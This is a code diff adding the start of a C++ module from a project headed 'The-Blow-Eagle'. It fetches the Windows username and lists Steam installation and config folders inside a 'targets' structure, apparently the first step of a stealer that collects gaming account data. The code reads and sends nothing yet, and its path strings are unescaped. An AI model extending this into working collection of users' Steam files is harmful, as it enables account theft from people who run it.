@@ -18,3 +18,31 @@
 |									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
 |==================================================================================================================|
 */
+
+#include "../targets.h"
+#include "../../config/config.h"
+#include <Lmcons.h>
+#include <Windows.h>
+
+std::string GetUser()
+{
+	TCHAR s[UNLEN + 1];
+	DWORD sizethis = UNLEN + 1;
+	GetUserName((TCHAR*)s, &sizethis);
+	std::wstring ws(s);
+	std::string userName(ws.begin(), ws.end());
+	return userName;
+}
+
+void gaming::Steam()
+{
+	std::string pathes[] = {
+		"C:\Program Files\Steam",
+		"C:\Program Files\Steam\config",
+		"C:\Program Files (x86)\Steam",
+		"C:\Program Files (x86)\Steam\config"
+	};
+
+	std::string user = GetUser();
+
+}
